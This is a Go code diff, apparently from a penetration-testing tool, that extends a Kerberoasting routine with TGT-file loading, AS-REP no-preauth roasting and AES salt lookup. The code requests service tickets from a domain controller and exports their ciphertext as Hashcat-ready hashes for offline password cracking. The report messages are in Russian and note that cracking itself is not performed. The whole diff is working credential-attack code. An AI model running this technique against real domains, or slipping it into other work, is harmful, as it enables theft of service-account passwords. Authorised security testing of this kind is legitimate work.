@@ -68,12 +68,36 @@ func normalizeSPNs(values []string, limit int) ([]string, error) {
 func kerberoastAccess(ctx context.Context, o AccessOptions) (AccessReport, error) {
 	r := AccessReport{Host: o.Host, Mode: "kerberoast"}
 	o.Domain = strings.TrimSuffix(strings.ToLower(o.Domain), ".")
-	if o.Credential.Username == "" {
-		return r, fmt.Errorf("Kerberoasting требует известную доменную учётку")
+	if err := ValidateKerberoastOptions(&o); err != nil {
+		return r, err
 	}
-	spns, err := normalizeSPNs(o.SPNs, o.MaxObjects)
+	if o.NoPreauthUser != "" || o.TGTFile != "" {
+		targets, err := explicitRoastTargets(o.SPNs, o.Domain, o.MaxObjects)
+		if err != nil {
+			return r, err
+		}
+		if o.TGTFile != "" {
+			if _, err := loadRoastSession(o.TGTFile, o.Domain); err != nil {
+				return r, err
+			}
+		}
+		address, err := resolveASREPKDC(ctx, o)
+		if err != nil {
+			return r, err
+		}
+		r.Endpoint = "tcp://" + address
+		if o.NoPreauthUser != "" {
+			return runNoPreauthRoastAt(ctx, address, o, targets, r)
+		}
+		return runKerberoastAt(ctx, address, o, targets, r)
+	}
+	requested, err := explicitRoastTargets(o.SPNs, o.Domain, o.MaxObjects)
 	if err != nil {
 		return r, err
+	}
+	var spns []string
+	for _, target := range requested {
+		spns = append(spns, target.SPN)
 	}
 	if len(o.TGSEtypes) == 0 {
 		o.TGSEtypes = []int32{18, 17, 23}
@@ -203,23 +227,17 @@ func runKerberoastAt(ctx context.Context, address string, o AccessOptions, targe
 	if o.RPS <= 0 {
 		o.RPS = 2
 	}
-	var next time.Time
-	exchange := func(packet []byte) ([]byte, error) {
-		if wait := time.Until(next); wait > 0 {
-			timer := time.NewTimer(wait)
-			defer timer.Stop()
-			select {
-			case <-ctx.Done():
-				return nil, ctx.Err()
-			case <-timer.C:
-			}
-		}
-		next = time.Now().Add(time.Second / time.Duration(o.RPS))
-		q, stop := context.WithTimeout(ctx, o.Timeout)
-		defer stop()
-		return kerberosTCP(q, address, packet)
+	exchange := roastExchange(ctx, address, o)
+	var tgt messages.Ticket
+	var key types.EncryptionKey
+	var err error
+	if o.TGTFile != "" {
+		var session roastSession
+		session, err = loadRoastSession(o.TGTFile, o.Domain)
+		tgt, key, o.Credential.Username = session.Ticket, session.Key, session.User
+	} else {
+		tgt, key, err = roastTGT(cfg, realm, o.Credential, exchange)
 	}
-	tgt, key, err := roastTGT(cfg, realm, o.Credential, exchange)
 	if err != nil {
 		state := "error"
 		var ke messages.KRBError
@@ -229,7 +247,11 @@ func runKerberoastAt(ctx context.Context, address string, o AccessOptions, targe
 		r.add("kerberoast-auth", "Kerberos TGT", state, "info", err.Error())
 		return r, err
 	}
-	r.add("kerberoast-auth", "Kerberos TGT", "observed", "info", "TGT получен и проверен; ключи и TGT не сохраняются")
+	authEvidence := "TGT получен и проверен; ключи и TGT не сохраняются"
+	if o.TGTFile != "" {
+		authEvidence = "TGT загружен из файла; область, срок и формат ключа проверены локально; подлинность проверяется KDC при TGS-запросе"
+	}
+	r.add("kerberoast-auth", "Kerberos TGT", "observed", "info", authEvidence)
 	var hashes []string
 	finish := func(err error) (AccessReport, error) {
 		if len(hashes) > 0 && o.ExportDir != "" {
@@ -276,23 +298,42 @@ func runKerberoastAt(ctx context.Context, address string, o AccessOptions, targe
 				e = fmt.Errorf("TGS verification failed")
 			}
 		}
-		if e == nil && (rep.PVNO != 5 || rep.Ticket.TktVNO != 5 || !rep.Ticket.SName.Equal(sname) || !rep.DecryptedEncPart.SName.Equal(sname) || !strings.EqualFold(rep.CRealm, realm)) {
+		if e == nil && (rep.PVNO != 5 || rep.Ticket.TktVNO != 5 || !rep.Ticket.SName.Equal(sname) || !rep.DecryptedEncPart.SName.Equal(sname) || !strings.EqualFold(rep.CRealm, realm) || !strings.EqualFold(rep.Ticket.Realm, realm) || !rep.CName.Equal(principal) || !containsEtype(o.TGSEtypes, rep.Ticket.EncPart.EType)) {
 			e = fmt.Errorf("TGS отвечает другому сервису/realm; referrals не выполняются")
 		}
 		saltUser := target.User
 		if e == nil && (rep.Ticket.EncPart.EType == 17 || rep.Ticket.EncPart.EType == 18) {
+			if target.User == "" {
+				if err := preserveRoastCipher(&r, rep.Ticket, o.ExportDir); err != nil {
+					return finish(err)
+				}
+				r.add("tgs/"+target.SPN, "TGS: "+target.SPN, "incomplete", "info", "AES-билет получен и сохранён; для Hashcat нужен владелец SPN: укажи SPN|логин")
+				continue
+			}
 			cacheKey := fmt.Sprintf("%s/%d", target.User, rep.Ticket.EncPart.EType)
 			saltUser = salts[cacheKey]
 			if saltUser == "" {
 				saltUser, e = roastSaltUser(cfg, realm, target.User, rep.Ticket.EncPart.EType, exchange)
-				if e == nil {
-					salts[cacheKey] = saltUser
+				if e != nil {
+					if err := preserveRoastCipher(&r, rep.Ticket, o.ExportDir); err != nil {
+						return finish(err)
+					}
+					r.add("tgs/"+target.SPN, "TGS: "+target.SPN, "incomplete", "info", "AES-билет сохранён; соль владельца не определена: "+e.Error())
+					if ctx.Err() != nil {
+						return finish(ctx.Err())
+					}
+					continue
 				}
+				salts[cacheKey] = saltUser
 			}
 		}
 		var hash string
 		if e == nil {
-			hash, e = tgsHash(rep.Ticket, target.User, saltUser)
+			user := target.User
+			if user == "" {
+				user = target.SPN
+			}
+			hash, e = tgsHash(rep.Ticket, user, saltUser)
 		}
 		if ctx.Err() != nil {
 			return finish(ctx.Err())
@@ -311,10 +352,14 @@ func runKerberoastAt(ctx context.Context, address string, o AccessOptions, targe
 		}
 		hashes = append(hashes, hash)
 		severity := "high"
-		if target.Machine {
+		if target.Machine || target.User == "" {
 			severity = "info"
 		}
-		r.add("tgs/"+target.SPN, "TGS: "+target.SPN, "confirmed", severity, fmt.Sprintf("Владелец %s; etype %d; ciphertext получен и подготовлен для Hashcat. Это не подтверждение слабого пароля; cracking не выполнялся.", target.User, rep.Ticket.EncPart.EType))
+		owner := target.User
+		if owner == "" {
+			owner = "не определён через LDAP"
+		}
+		r.add("tgs/"+target.SPN, "TGS: "+target.SPN, "confirmed", severity, fmt.Sprintf("Владелец %s; etype %d; ciphertext получен и подготовлен для Hashcat. Это не подтверждение слабого пароля; cracking не выполнялся.", owner, rep.Ticket.EncPart.EType))
 		if o.ExportDir == "" {
 			r.add("tgs-hash/"+target.SPN, "Hashcat TGS", "observed", "info", hash)
 		}
@@ -517,6 +562,9 @@ func roastSaltUser(cfg *config.Config, realm, user string, etype int32, exchange
 		if ke.ErrorCode != errorcode.KDC_ERR_PREAUTH_REQUIRED {
 			return "", ke
 		}
+		if (ke.CRealm != "" && !strings.EqualFold(ke.CRealm, realm)) || (len(ke.CName.NameString) > 0 && (len(ke.CName.NameString) != 1 || !strings.EqualFold(ke.CName.NameString[0], user))) {
+			return "", fmt.Errorf("AES salt: ответ относится к другому пользователю/realm")
+		}
 		if e = pas.Unmarshal(ke.EData); e != nil {
 			return "", e
 		}
@@ -524,6 +572,9 @@ func roastSaltUser(cfg *config.Config, realm, user string, etype int32, exchange
 		var rep messages.ASRep
 		if e = rep.Unmarshal(reply); e != nil {
 			return "", e
+		}
+		if rep.PVNO != 5 || !strings.EqualFold(rep.CRealm, realm) || len(rep.CName.NameString) != 1 || !strings.EqualFold(rep.CName.NameString[0], user) {
+			return "", fmt.Errorf("AES salt: ответ относится к другому пользователю/realm")
 		}
 		pas = rep.PAData
 	}
